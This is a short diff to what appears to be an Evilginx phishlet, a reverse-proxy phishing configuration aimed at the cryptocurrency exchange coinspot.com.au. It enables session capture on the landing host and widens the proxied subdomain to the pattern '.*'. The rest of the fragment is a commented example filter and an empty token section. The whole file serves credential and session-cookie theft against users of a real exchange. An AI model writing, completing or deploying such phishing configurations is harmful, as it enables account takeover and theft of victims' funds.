@@ -1,6 +1,6 @@
 min_ver: '3.0.0'
 proxy_hosts:
-  - {phish_sub: '', orig_sub: '', domain: 'coinspot.com.au', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: '.*', domain: 'coinspot.com.au', session: true, is_landing: true, auto_filter: true}
 sub_filters:
 #  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
 auth_tokens:
